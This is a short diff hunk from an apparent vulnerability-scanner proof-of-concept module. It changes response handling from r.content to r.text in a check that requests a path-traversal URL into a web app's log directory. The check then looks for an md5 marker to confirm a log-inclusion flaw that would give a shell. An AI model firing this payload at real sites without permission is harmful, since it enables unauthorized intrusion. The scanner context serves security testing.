@@ -52,13 +52,13 @@ class Poc(ABPoc):
             #code, head, res, errcode, _ = curl.curl2(arg+payload)
             r = requests.get(self.target + payload)
 
-            if r.status_code == 200 and 'echo' in r.content:
+            if r.status_code == 200 and 'echo' in r.text:
                 s = time.strftime("%d/%m/%Y")
                 payload = '/index.php?s=my/show/id/\..\\temp\logs\%s_%s_%s.log' % (
                     s[8:], s[3:5], s[0:2])
                 r = requests.get(self.target + payload)
 
-                if r.status_code and '4beed3b9c4a886067de0e3a094246f78' in r.content:
+                if r.status_code and '4beed3b9c4a886067de0e3a094246f78' in r.text:
                     #security_hole('getshell '+ arg + payload)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
